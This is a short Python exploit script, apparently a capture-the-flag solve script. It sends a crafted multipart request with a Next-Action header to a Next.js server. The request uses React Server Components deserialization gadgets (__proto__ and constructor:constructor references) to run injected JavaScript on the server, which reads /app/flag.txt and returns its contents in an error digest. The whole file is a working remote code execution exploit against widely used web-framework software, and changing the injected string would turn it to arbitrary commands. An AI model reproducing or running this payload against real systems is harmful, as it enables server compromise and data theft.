#!/usr/bin/env python3
import sys
import json
import re
import requests
from urllib.parse import urljoin

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} http://TARGET:PORT")
    sys.exit(1)

target = sys.argv[1].rstrip("/") + "/"

js = (
    "var res=process.mainModule.require('fs')"
    ".readFileSync('/app/flag.txt','utf8').trim();"
    "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:res});"
)

payload = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": "{\"then\":\"$B1337\"}",
    "_response": {
        "_prefix": js,
        "_chunks": "$Q2",
        "_formData": {
            "get": "$1:constructor:constructor"
        }
    }
}

files = {
    "0": (None, json.dumps(payload)),
    "1": (None, '"$@0"'),
    "2": (None, "[]"),
}

headers = {
    "Next-Action": "x",
    "X-Nextjs-Request-Id": "b5dce965",
    "X-Nextjs-Html-Request-Id": "b5dce965",
}

r = requests.post(target, headers=headers, files=files, timeout=10)

print(r.text)

# python3 solve.py http://<spawned-host>:<port>
